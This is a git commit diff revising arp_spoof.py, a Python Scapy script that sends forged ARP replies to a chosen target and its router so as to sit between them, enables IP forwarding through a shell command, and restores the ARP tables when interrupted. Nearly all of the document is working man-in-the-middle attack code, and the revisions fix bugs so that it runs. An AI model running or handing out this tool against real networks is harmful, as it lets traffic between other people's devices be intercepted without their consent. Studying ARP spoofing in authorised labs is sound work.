8a76c5db82a64dbaeeb8eaa9e916b497371a9d7e
Amir Serati <abexamir@gmail.com>
2021-06-19 12:43:00 +0000

    some revisions

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,3 +1,6 @@
+import subprocess
+import sys
+
 import scapy.all as scapy
 import time
 import argparse
@@ -7,44 +10,51 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target_ip",
                         help="Target IP")
-    parser.add_argument("-g", "--router", dest="router_ip",
-                        help="Router IP")                        
-    options = parser.parse_args()
-    return options
+    parser.add_argument("-r", "--router", dest="router_ip",
+                        help="Router IP")
+    return parser.parse_args()
 
 
 def get_mac(ip):
-        arp_request = scapy.ARP(pdst = ip)
-        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast =  broadcast/arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout = 1, berbose = False)[0]
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[
+        0]
+    return answered_list[0][1].hwsrc
 
-        return answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip )
-    scapy.send(packet, verbose= False)
+def spoof(target, spoof_ip):
+    target_mac = get_mac(target)
+    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
-    scapy.send(packet, count = 4, verbose = False)
-
-target_ip = get_arguments().target_ip
-router_ip = get_arguments().router_ip
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
 
 try:
-    sent_packets_count = 0
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)
+    sent_packets_counts = 0
+    options = get_arguments()
+
+    target_ip = options.target_ip
+    router_ip = options.router_ip
+
     while True:
         spoof(target_ip, router_ip)
         spoof(router_ip, target_ip)
-        sent_packets_count += 2
-        print("\r[+] Packets sent:" + str(sent_packets_count), end = "")
+        sent_packets_counts = sent_packets_counts + 2
+        print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
+        sys.stdout.flush()
         time.sleep(2)
-except (KeyboardInterrupt):
-    print("\n[-] Detected Ctrl + C ... Reseting ARP tables .... Please Wait.")
+
+except KeyboardInterrupt:
+    print("[+] Detected Keyboard Interrupt .... Resetting ARP Table")
     restore(target_ip, router_ip)
     restore(router_ip, target_ip)
+    print("[+] ARP Table reset done")
